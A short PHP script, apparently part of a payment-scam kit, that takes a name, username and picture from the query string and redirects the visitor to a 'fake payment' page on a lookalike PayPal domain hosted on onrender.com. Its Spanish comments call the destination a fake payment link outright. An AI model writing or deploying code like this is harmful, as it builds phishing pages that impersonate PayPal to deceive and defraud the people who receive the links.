<?php
// pago.php

$name = $_GET['n'] ?? '';
$user = $_GET['u'] ?? '';
$pic = $_GET['pic'] ?? '';

// Generar el enlace de pago falso
$paylink = "https://paypal-me.onrender.com/pago_falso.php?n=$name&u=$user&pic=$pic";

// Redirigir al enlace de pago falso
header("Location: $paylink");
exit();
?>
